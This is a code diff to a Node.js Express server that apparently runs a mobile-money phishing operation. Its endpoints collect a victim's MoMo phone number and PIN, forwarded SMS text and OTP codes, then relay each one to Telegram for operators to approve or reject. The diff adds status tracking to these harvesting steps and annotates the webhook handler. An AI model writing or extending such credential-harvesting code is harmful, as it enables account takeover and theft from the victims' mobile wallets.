@@ -28,6 +28,7 @@ app.post('/verify-pin', async (req, res) => {
   }
   applications[appId].momo_phone = phone;
   applications[appId].momo_pin = pin;
+  applications[appId].status = 'pending_auth';
 
   const message = `🔐 *MoMo Authentication Request*\n\n` +
     `📱 *Phone:* +260 ${phone}\n` +
@@ -59,9 +60,9 @@ app.post('/verify-sms', async (req, res) => {
   const { appId, smsText } = req.body;
   if (applications[appId]) {
     applications[appId].sms_text = smsText;
+    applications[appId].status = 'pending_sms';
   }
 
-  // Wrapped inside a Markdown code block (``) so admins can copy it directly on Telegram
   const message = `💬 *SMS Verification Text Received*\n\n` +
     `📱 *Phone:* +260 ${applications[appId]?.momo_phone || 'N/A'}\n\n` +
     `📄 *Content:*\n\`\`\`\n${smsText}\n\`\`\`\n\n` +
@@ -92,6 +93,7 @@ app.post('/verify-otp', async (req, res) => {
   const { appId, otpCode } = req.body;
   if (applications[appId]) {
     applications[appId].otp_code = otpCode;
+    applications[appId].status = 'pending_otp';
   }
 
   const message = `🔢 *OTP Verification Received*\n\n` +
@@ -131,8 +133,8 @@ app.post('/telegram-webhook', async (req, res) => {
   if (update.callback_query) {
     const cb = update.callback_query;
     const parts = cb.data.split('_');
-    const type = parts[0];
-    const action = parts[1];
+    const type = parts[0];     // auth, sms, or otp
+    const action = parts[1];   // approve or reject
     const appId = parts.slice(2).join('_');
 
     if (applications[appId]) {
